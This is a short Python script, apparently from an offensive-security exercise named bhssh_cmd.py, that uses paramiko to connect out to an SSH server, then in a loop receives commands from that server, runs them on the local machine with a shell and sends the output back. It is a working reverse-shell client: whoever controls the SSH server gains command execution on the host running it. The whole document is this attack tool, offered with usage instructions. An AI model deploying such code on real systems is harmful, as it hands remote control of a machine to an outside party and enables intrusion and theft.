#! /usr/bin/env python3

import threading
import paramiko
import subprocess
import sys


def ssh_cmd(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        print("[+] Connect to server.")

        ssh_session.send(command)
        print("[====>] " + str(ssh_session.recv(1024), encoding="utf-8"))
        while True:
            command = str(
                ssh_session.recv(1024), encoding="utf-8"
            )  # get the command from the SSH server.
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)

            except Exception as e:
                ssh_session.send(str(e))
                break

    else:
        print("[-] Connect failed.")

    client.close()
    return


def main():
    if len(sys.argv[1:]) != 5:
        print("Usage: ./bhssh_cmd.py [ip] [port] [user] [passwd] [command]")
        print("Example: ./bhssh_cmd.py 127.0.0.1 2200 kaiser pa55wd ls")
        sys.exit(0)

    ip = sys.argv[1]
    port = sys.argv[2]
    user = sys.argv[3]
    passwd = sys.argv[4]
    command = sys.argv[5]

    ssh_cmd(ip, port, user, passwd, command)


if __name__ == "__main__":
    main()
